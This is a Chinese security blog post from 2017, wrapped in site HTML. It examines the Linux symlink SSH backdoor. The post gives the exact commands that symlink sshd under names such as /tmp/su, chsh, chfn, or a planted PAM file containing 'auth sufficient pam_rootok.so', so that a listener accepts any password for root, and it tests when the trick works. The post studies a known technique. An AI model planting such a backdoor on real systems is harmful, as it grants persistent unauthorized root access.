@@ -1,0 +1,1249 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Security,Linux," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/static/picture/icon.jpg?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="0x00 前言学习了Sevck发表Linux软连接后门的《一条命令引发的思考》，还是存在几个疑惑点，仔细探究之后就有了这篇文章">
+<meta name="keywords" content="Security,Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux软连接ssh后门之我见">
+<meta property="og:url" content="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/index.html">
+<meta property="og:site_name" content="BlackWolfsec">
+<meta property="og:description" content="0x00 前言学习了Sevck发表Linux软连接后门的《一条命令引发的思考》，还是存在几个疑惑点，仔细探究之后就有了这篇文章">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_00.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_0.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_1.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_2.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_3.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_4.png">
+<meta property="og:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_5.png">
+<meta property="og:updated_time" content="2017-08-18T01:59:16.044Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux软连接ssh后门之我见">
+<meta name="twitter:description" content="0x00 前言学习了Sevck发表Linux软连接后门的《一条命令引发的思考》，还是存在几个疑惑点，仔细探究之后就有了这篇文章">
+<meta name="twitter:image" content="http://blackwolfsec.cc/static/picture/ssh_backdoor_00.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/"/>
+
+
+
+
+
+  <title>Linux软连接ssh后门之我见 | BlackWolfsec</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BlackWolfsec</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">silence & hear</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BlackWolfsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/static/picture/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BlackWolfsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux软连接ssh后门之我见</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-24T00:00:00+08:00">
+                2017-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习了Sevck发表Linux软连接后门的<a href="https://xianzhi.aliyun.com/forum/mobile/read/790.html" target="_blank" rel="noopener">《一条命令引发的思考》</a>，还是存在几个疑惑点，仔细探究之后就有了这篇文章<br><a id="more"></a></p>
+<h2 id="0x01简单回顾"><a href="#0x01简单回顾" class="headerlink" title="0x01简单回顾"></a>0x01简单回顾</h2><p><strong>一、Linux经典软连接后门命令</strong><br>1.在被控制端执行：<br>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345建立sshd的软连接<br>2.本地客户端执行：<br>ssh <a href="mailto:root@x.x.x.x" target="_blank" rel="noopener">root@x.x.x.x</a> -p 12345接着输入任意密码就可以root用户权限登陆了<br>实际测试中发现，如果root用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：<br>ssh <a href="mailto:ubuntu@x.x.x.x" target="_blank" rel="noopener">ubuntu@x.x.x.x</a> -p 12345接着输入任意密码就可以ubuntu用户权限登陆了<br><strong>二、后门原理</strong><br> 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0（root）即可成功认证登陆</p>
+<h2 id="0x02疑惑与探究"><a href="#0x02疑惑与探究" class="headerlink" title="0x02疑惑与探究"></a>0x02疑惑与探究</h2><p>1.不建立链接直接启动/usr/sbin/sshd是否也能任意密码登陆<br>针对这个疑惑很容易验证，被控端执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/sshd -oport=12345</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_00.png" alt="直接启动sshd" title="ssh_backdoor_00.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败<br>实践结果表明不能通过直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门<br>2.sshd是否允许PAM认证对后门是否有影响<br>修改<code>/etc/ssh/sshd_config</code>修改设置<code>UsePAM no</code></p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_0.png" alt="设置UsePAM=no" title="ssh_backdoor_0.png"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br></pre></td></tr></table></figure></p>
+<p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败</p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_1.png" alt="sshd禁止pam登陆" title="ssh_backdoor_1.png"></p>
+<p>实践结果表明禁止sshd使用PAM认证后，ssh登陆不调用PAM，严格验证用户密码，所以不能建立任意密码登录后门。<br>3.软连接的路径及文件名是否有限制<br>首先验证修改路径对后门功能是否有影响，修改软连接路径为<code>/home/su</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345</span><br></pre></td></tr></table></figure></p>
+<p>客户端ssh root:任意密码@x.x.x.x 12345仍然成功登陆</p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_2.png" alt="修改软连接/home/su" title="ssh_backdoor_2.png"></p>
+<p>实践表明软连接的路径对后门的功能没有影响<br>其次修改软连接文件名对后门功能是否有影响，修改软连接为<code>/tmp/pam_test</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_3.png" alt="修改软连接为/tmp/pam_test" title="ssh_backdoor_3.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证失败<br>实践表明软连接的文件名会影响后门功能，而且在ssh开启pam认证的前提下，默认调用的pam配置文件按是软连接的文件名（pam_test）<br>4.此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件<br>在被控端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"auth sufficient pam_rootok.so"</span> &gt;&gt; /etc/pam.d/hacker</span><br><span class="line">cat /etc/pam.d/hacker</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345</span><br></pre></td></tr></table></figure></p>
+<p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证成功</p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_4.png" alt="pam_rootok.so" title="ssh_backdoor_4.png"><br>实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含<code>auth sufficient pam_rootok.so</code>即可无密码登陆<br>最后在<code>etc/pam.d/</code>目录下查找包含<code>pam_rootok.so</code>配置的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ |xargs grep <span class="string">"pam_rootok"</span></span><br></pre></td></tr></table></figure></p>
+<p>在笔者的测试环境下还有”chsh”、”chfn”包含<code>pam_rootok.so</code><br>被控端执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12346</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12347</span><br></pre></td></tr></table></figure></p>
+<p>客户端<code>ssh root:任意密码@x.x.x.x 12346</code>仍然认证成功<br>客户端<code>ssh root:任意密码@x.x.x.x 12347</code>仍然认证成功</p>
+<p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_5.png" alt="其他可用后门软连接命名" title="ssh_backdoor_5.png"></p>
+<h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><ol>
+<li>Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</li>
+<li>如果被控主机不允许root登陆可用其他已存在用户登陆</li>
+<li>通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)</li>
+<li>任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>,只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn</li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Security/" rel="tag"># Security</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/02/10/CVE-2017-5539/" rel="next" title="b2evolution目录遍历bypass之CVE-2017-5539">
+                <i class="fa fa-chevron-left"></i> b2evolution目录遍历bypass之CVE-2017-5539
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/12/Eternalblue_ms17-010/" rel="prev" title="Eternalblue（MS17-010）纯Python3利用脚本">
+                Eternalblue（MS17-010）纯Python3利用脚本 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/static/picture/logo.jpg"
+               alt="BlackWolfsec" />
+          <p class="site-author-name" itemprop="name">BlackWolfsec</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://anquanquan.info" target="_blank" title="安全圈">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  安全圈
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://das.scusec.org/" target="_blank" title="小黑屋">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  小黑屋
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.ourren.com/" target="_blank" title="ourren">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  ourren
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://wps2015.org/" target="_blank" title="wps2015">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  wps2015
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://ohroot.com/" target="_blank" title="半饱和">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  半饱和
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.mauu.me/" target="_blank" title="ksss'blog">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  ksss'blog
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://ecma.io/" target="_blank" title="该隐">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  该隐
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sccsec.com" target="_blank" title="胖胖的博客">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  胖胖的博客
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://phantom0301.cc/" target="_blank" title="零の杂货铺">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  零の杂货铺
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://syean.cn/" target="_blank" title="我是_一棵树_">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  我是_一棵树_
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01简单回顾"><span class="nav-number">2.</span> <span class="nav-text">0x01简单回顾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02疑惑与探究"><span class="nav-number">3.</span> <span class="nav-text">0x02疑惑与探究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03小结"><span class="nav-number">4.</span> <span class="nav-text">0x03小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BlackWolfsec</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="http://blackwolfsec.cc/">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('10');
+                  if (upperBound >= 0) {
